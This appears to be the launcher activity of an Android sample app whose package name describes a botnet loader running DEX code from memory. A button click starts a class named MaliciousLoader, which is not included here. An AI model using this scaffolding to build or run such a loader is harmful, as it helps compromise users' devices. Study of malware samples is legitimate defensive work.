package com.a.botnetloaderfrominmemorydexexample;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    Button button1;
    TextView textView1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        button1 = findViewById(R.id.button);
        button1.setOnClickListener(this);
        textView1 = findViewById(R.id.textView);
    }

    @Override
    public void onClick(View v) {
        if (v.getId() == R.id.button) {
            performAction();
        }
    }

    private void performAction() {
        ExecutorService pool = Executors.newFixedThreadPool(1);
        pool.submit(new MaliciousLoader(this.getApplicationContext()));
    }
}
